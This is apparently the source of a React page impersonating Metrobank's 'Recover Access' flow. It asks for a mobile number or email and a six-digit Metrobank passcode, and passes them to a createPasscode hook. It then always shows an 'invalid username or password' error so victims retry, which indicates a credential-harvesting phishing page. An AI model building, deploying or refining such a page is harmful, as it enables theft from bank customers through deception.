import { useEffect, useState, useRef } from "react"; // Removed unused imports
import { useNavigate } from "react-router-dom";
import { Ripple } from "primereact/ripple";
import { CircleAlert } from "lucide-react";
import { motion } from "framer-motion";
import bg from "../assets/recoveryAcc/Background.jpg";
import logo from "../assets/recoveryAcc/Logo.png";

import usePasscode from "../hooks/usePasscode";

export default function RecoveryAccess() {
  const [isPassword, setIsPassword] = useState(true);
  const [useEmail, setUseEmail] = useState(false);
  const [Email, setEmail] = useState<string>("");
  const [phoneNo, setPhoneNo] = useState<string>("");

  const [phoneNoFocus, setPhoneNoFocus] = useState(false);
  const [emailFocus, setEmailFocus] = useState(false);

  const [invalidPhone, setInvalidPhone] = useState(false);
  const [invalidEmail, setInvalidEmail] = useState(false);
  const [invalidCredentials, setInvalidCredentials] = useState(false);

  const [passcodeModal, setPasscodeModal] = useState(false);
  const [closeModal, setCloseModal] = useState(false);

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const navigate = useNavigate();

  const [code, setCode] = useState<string[]>(["", "", "", "", "", ""]);
  const inputs = useRef<(HTMLInputElement | null)[]>([]);

  const { createPasscode, loading } = usePasscode();

  useEffect(() => {
    !useEmail ? setInvalidPhone(phoneNo === "" || phoneNo.length < 10) : null;
  }, [phoneNo, useEmail]);

  useEffect(() => {
    if (useEmail) {
      setInvalidEmail(!emailRegex.test(Email) || Email === "");
    }
  }, [Email, useEmail]);

  const handleChange = (value: string, index: number) => {
    if (!/^[0-9]?$/.test(value)) return;

    const newCode = [...code];
    newCode[index] = value;
    setCode(newCode);

    if (value && index < code.length - 1) {
      inputs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (
    e: React.KeyboardEvent<HTMLInputElement>,
    index: number,
  ) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      inputs.current[index - 1]?.focus();
    }
  };

  const passcode = code.join("");
  const isPasscodeComplete = passcode.length === 6;

  const handleSubmit = () => {
    handleAddPasscode();
    setCode(["", "", "", "", "", ""]);
  };

  useEffect(() => {
    if (isPasscodeComplete) {
      const timer = setTimeout(() => {
        handleSubmit();
      }, 300);

      return () => clearTimeout(timer);
    }
  }, [isPasscodeComplete]);

  const handleAddPasscode = async () => {
    if (!Email && !phoneNo) return;
    await createPasscode({ email: Email, phone: phoneNo, code: passcode });
    setInvalidCredentials(true);
    setTimeout(() => setInvalidCredentials(false), 5000);
  };

  return (
    <div className="h-[100vh] bg-white flex flex-col">
      <header
        className="flex flex-col bg-cover bg-no-repeat lg:h-[234px] bg-center"
        style={{ backgroundImage: `url(${bg})` }}
      >
        {/* Header unchanged */}
        <div className="bg-transparent space-between p-3.5 relative">
          <img src={`${logo}`} alt="Logo" className="h-9.5" />
          <button
            className="absolute top-0 right-0 text-white font-bold my-2 text-[18px] px-4.5 py-3 hover:bg-[#807C7CCC]/50 rounded-full cursor-pointer"
            title="close"
            onClick={() => setCloseModal(true)}
          >
            ✕
          </button>
        </div>

        <h3 className="text-white text-[21px] bg-transparent tracking-wider flex-1 text-center">
          Recover Access
        </h3>

        <div className="flex justify-center bg-white w-full flex-1 pt-4.5 x-shadow">
          {/* Progress bar unchanged */}
          <div className="relative">
            <div className=" flex relative -mt-1">
              <div>
                <span className="text-white rounded-full mx-18 md:mx-26.5 py-[5px] px-[9px] bg-blue-300 text-[12px]">
                  1
                </span>
              </div>
              <div className="absolute w-32 md:w-46 h-3.5 border-b-1 border-gray-400 left-1/2 -translate-x-1/2" />
              <div>
                <span className="text-white rounded-full mx-18 md:mx-26.5 py-[5px] px-[9px] bg-gray-400 text-[12px]">
                  2
                </span>
              </div>
            </div>
            <div className=" flex justify-center -mt-1.5">
              <button className="p-ripple ripple-gray flex-1  md:px-6 py-5.75 cursor-pointer">
                <span className="text-sm text-gray-500 tracking-wide">
                  Details
                </span>
                <Ripple />
              </button>
              <button className="p-ripple ripple-gray flex-1  md:px-6 py-5.75 cursor-pointer">
                <span className="text-sm text-gray-500 tracking-wide">
                  Done
                </span>
                <Ripple />
              </button>
            </div>
          </div>
        </div>
      </header>
      <div className=" flex flex-1 justify-center">
        <div className="md:w-[600px] p-5">
          <p className="text-[16px] text-[#000000de] mb-7">
            Which of your account details do you need help with?
          </p>

          <div className="flex text-sm sm: text-[13px] md:text-base border-1 rounded-sm border-blue-900">
            <button
              className={`p-ripple ripple-gray flex-1 p-1 cursor-pointer ${isPassword ? "bg-[#07a6ea] text-white" : ""}`}
              onClick={() => setIsPassword(true)}
            >
              PASSWORD
              <Ripple />
            </button>
            <button
              className={`p-ripple ripple-gray flex-1 p-1 cursor-pointer ${!isPassword ? "bg-[#07a6ea] text-white" : ""}`}
              onClick={() => {
                setIsPassword(false);
                console.log(
                  invalidEmail,
                  invalidPhone,
                  code,
                  passcode.length,
                  isPasscodeComplete,
                );
              }}
            >
              USERNAME
              <Ripple />
            </button>
          </div>

          <div className="mt-16">
            {/* FIXED: Proper JSX conditional rendering */}
            {!useEmail ? (
              <div className="flex gap-2">
                <div className="flex flex-col ">
                  <p className="text-[12px] text-gray-400 mb-2 font-light">
                    Country
                  </p>
                  <select className="border-b text-[13px] md:text-base border-gray-300 px-2 pb-1 outline-none">
                    <option>PH</option>
                    <option>US</option>
                  </select>
                </div>
                <div className="flex-1 ">
                  <div className="relative ">
                    <p
                      className={`t-0 l-0 text-[12px] ${invalidPhone && phoneNoFocus ? "text-red-500" : "text-gray-400"} font-light`}
                    >
                      Mobile Number
                    </p>
                    <div className="relative">
                      <motion.input
                        type="text"
                        value={phoneNo}
                        onBlur={() => setPhoneNoFocus(true)}
                        onChange={(e) => {
                          // Numbers only - remove non-digits
                          const numbersOnly = e.target.value.replace(
                            /[^0-9]/g,
                            "",
                          );
                          setPhoneNo(numbersOnly);
                        }}
                        transition={{ duration: 0.3 }}
                        className={`border-b w-full text-sm md:text-base ${invalidPhone && phoneNoFocus ? "border-red-400 border-b-2" : "hover:border-b-2 hover:border-black focus:border-blue-900 focus:border-b-2 border-gray-300"}  py-1 pl-12 outline-none pr-4`}
                        placeholder="Registered in the branch"
                      />

                      {/* Fixed +63 prefix */}
                      <span className="absolute left-0 top-1/2 -translate-y-1/2 text-gray-500 font-light">
                        +63
                      </span>
                    </div>
                  </div>
                  {phoneNo.length === 0 && phoneNoFocus ? (
                    <p className="text-red-500 my-1 text-[12px]">
                      Please enter your mobile number.
                    </p>
                  ) : phoneNo.length < 10 && phoneNoFocus ? (
                    <p className="text-red-500 mt-1 text-[12px]">
                      Invalid phone number, should be minimum of 10 digits.
                    </p>
                  ) : null}
                </div>
              </div>
            ) : (
              <motion.div
                initial={{ opacity: 0, scale: 0 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ duration: 0.3, ease: "easeOut" }}
                style={{ originX: 0.0, originY: 0.5 }}
              >
                <p
                  className={`text-[12px] mb-2 ${invalidEmail && emailFocus ? "text-red-500" : "text-gray-400"} font-light`}
                >
                  Email address
                </p>
                <input
                  type="email"
                  onChange={(e) => setEmail(e.target.value)}
                  onBlur={() => setEmailFocus(true)}
                  className={`border-b w-full border-gray-300 ${invalidEmail && emailFocus ? "border-red-400 border-b-2" : "hover:border-b-2 hover:border-black focus:border-blue-900 focus:border-b-2 border-gray-300"} py-1 outline-none`}
                  placeholder="Enter your email address"
                  required
                />
                {!emailRegex.test(Email) && emailFocus ? (
                  <p className="text-red-500 my-1 text-[12px]">
                    {Email === ""
                      ? "Please enter your email address."
                      : "Email address does not have the correct format (missing dot and @)."}
                  </p>
                ) : null}
              </motion.div>
            )}
            {!useEmail ? (
              <button
                onClick={() => {
                  setUseEmail(true);
                  setPhoneNo("");
                  setInvalidPhone(false);
                }}
                className=" mt-4.5 text-blue-700 text-[11.5px] font-bold tracking-widest cursor-pointer"
              >
                Use email address instead
              </button>
            ) : (
              <button
                onClick={() => {
                  setUseEmail(false);
                  setEmail("");
                  setInvalidEmail(false);
                }}
                className=" mt-4.5 text-blue-700 text-[11.5px] font-bold tracking-widest cursor-pointer"
              >
                Use mobile number instead
              </button>
            )}
            <div className="flex-col flex pt-10 gap-4">
              <motion.button
                whileHover={
                  invalidEmail || invalidPhone
                    ? {} // Enabled state hover
                    : { backgroundColor: "#0F578F" } // Disabl
                }
                transition={{ duration: 0.3 }}
                className={`flex-1 font-[16px] rounded-sm p-2.5 ${
                  invalidEmail || invalidPhone
                    ? "bg-black/12 text-black/26"
                    : "bg-[#126EBD] text-white b-shadow cursor-pointer"
                }`}
                onClick={() => {
                  setPasscodeModal(true);
                }}
                disabled={invalidEmail || invalidPhone}
              >
                NEXT
              </motion.button>

              <motion.button
                whileHover={{ backgroundColor: "rgba(0, 123, 196,.2)" }}
                transition={{ duration: 0.5, ease: "easeOut" }}
                className="flex-1 font-[16px] rounded-sm p-2.5 text-[#007bc4] hidden sm:block "
                onClick={() => setCloseModal(true)}
              >
                CANCEL
              </motion.button>
            </div>
          </div>
        </div>
      </div>
      {passcodeModal && (
        <div className="fixed flex justify-center items-center h-[100vh] w-full bg-black/50">
          <div className="h-95 w-150 bg-white rounded-sm">
            <div className="p-3 flex border-b-1 border-gray-300 relative">
              <h1 className="p-1.5 text-xl">Metrobank Passcode</h1>
              <button
                className="absolute top-0 right-0 text-gray-400 font-bold my-1.5 text-[18px] px-4.5 py-3 hover:bg-[#807C7CCC]/50 rounded-full cursor-pointer"
                title="close"
                onClick={() => setPasscodeModal(false)}
              >
                ✕
              </button>
            </div>
            <div className="p-6 flex flex-col items-center">
              <p className="text-[17.5px] text-gray-700 ">
                Please enter your passcode.
              </p>
              <div className="flex flex-col items-center ">
                <div className="flex gap-1.5 my-8">
                  {code.map((digit, index) => (
                    <input
                      key={index}
                      ref={(el) => {
                        inputs.current[index] = el;
                      }}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit ? "●" : ""}
                      onChange={(e) => {
                        handleChange(e.target.value, index);
                      }}
                      onKeyDown={(e) => handleKeyDown(e, index)}
                      className="w-10 h-12 text-center text-3xl text-[#007BC4] i-shadow border border-gray-300 rounded-md focus:border-blue-500 focus:outline-none"
                    />
                  ))}
                </div>
              </div>
              <button
                className={`py-3 rounded-md text-[17px] flex items-center justify-center ${!isPasscodeComplete ? "bg-black/12  text-black/24" : "bg-[#126EBD] text-white b-shadow cursor-pointer"} w-full`}
                disabled={!isPasscodeComplete}
                onClick={() => {
                  handleSubmit();
                }}
              >
                {loading ? (
                  <div className="w-7 h-7 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                ) : (
                  "Login"
                )}
              </button>
              <p className="text-[14px] text-[#126ebd] text-justify mt-10">
                Forgot your passcode? Call Contact Center at (632) 88-700-700 or
                Domestic toll-free number (1-800-1888-5775) to reset your
                passcode.
              </p>
            </div>
          </div>
          {invalidCredentials && (
            <div className="absolute bottom-4 flex bg-red-400 text-white gap-5 p-3.5 w-[95vw] lg:w-140">
              <div className="flex justify-center items-center ">
                <CircleAlert size={25} />
              </div>
              <div className=" flex-1">
                <span className="text-[14.5px] text-wrap mr-7">
                  You have entered an invalid username or password. Please try
                  again.
                </span>
              </div>
              <div className="flex justify-center items-center">
                <span className="text-[8.5px] rounded-full px-2 py-1 -mr-1 hover:bg-black/24 cursor-pointer">
                  ✕
                </span>
              </div>
            </div>
          )}
        </div>
      )}
      {closeModal && (
        <div className="fixed w-full h-[100vh] bg-black/50 flex justify-center items-center">
          <div className="bg-white h-53 w-90 flex flex-col p-2 z-2 rounded-xl">
            <h1 className="p-4 text-[21px]">Confirmation</h1>
            <p className="text-wrap flex-1 text-[17px] p-3">
              You are about to cancel the account verificaton. Do you want to
              continue?
            </p>
            <div className="flex justify-end text-sm gap-2">
              <button
                className="text-center px-5 py-2 rounded-md hover:bg-[#126ebd]/20"
                onClick={() => {
                  setCloseModal(false);
                }}
              >
                No
              </button>
              <button
                className="text-center font-bold rounded-md text-[#126ebd] hover:bg-[#126ebd]/20 px-5  py-2"
                onClick={() => {
                  setCloseModal(false);
                  navigate("/");
                }}
              >
                Yes
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
